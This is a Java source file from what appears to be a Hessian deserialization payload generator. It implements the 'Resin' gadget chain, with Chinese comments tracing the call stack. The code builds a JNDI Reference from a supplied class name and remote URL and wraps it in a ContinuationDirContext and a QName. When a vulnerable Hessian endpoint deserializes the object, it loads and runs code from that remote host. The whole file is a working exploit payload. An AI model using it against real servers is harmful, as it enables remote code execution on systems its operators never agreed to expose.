package cn.butler.hessian.payloads;

import cn.butler.payloads.ObjectPayload;
import com.caucho.naming.QName;
import cn.butler.hessian.util.UtilFactory;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.yso.payloads.util.Reflections;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.util.Hashtable;

/**
 * Resin利用链的调用栈:
 *  -HashMap#put
 *    -XString#equals(QName)
 *      -com.caucho.naming.QName#toString()
 *         -javax.naming.spi.ContinuationContext#composeName
 *           -javax.naming.spi.ContinuationContext#getTargetContext
 *             -javax.naming.spi.NamingManager#getContext
 *               --javax.naming.spi.NamingManager#getObjectInstance
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"com.caucho:com.caucho:4.0.45"})
@Authors({ Authors.B0T1ER })
public class Resin implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String[] parts = command.split(":", 2); // 使用第一个冒号进行切割，限制切割为最多两个部分
        String className = parts[0]; // 第一个部分是类名
        String url = parts[1]; // 第二个部分是URL

        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        Reflections.setFieldValue(cpe, "cause", null);
        Reflections.setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(new Reference("Foo", className, url));

        Reflections.setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        QName qName = new QName(ctx, "foo", "bar");
        return UtilFactory.makeToStringTriggerStable(qName);
    }

//    public static void main(final String[] args) throws Exception {
//        PayloadRunner.run(Resin.class, args);
//    }
}
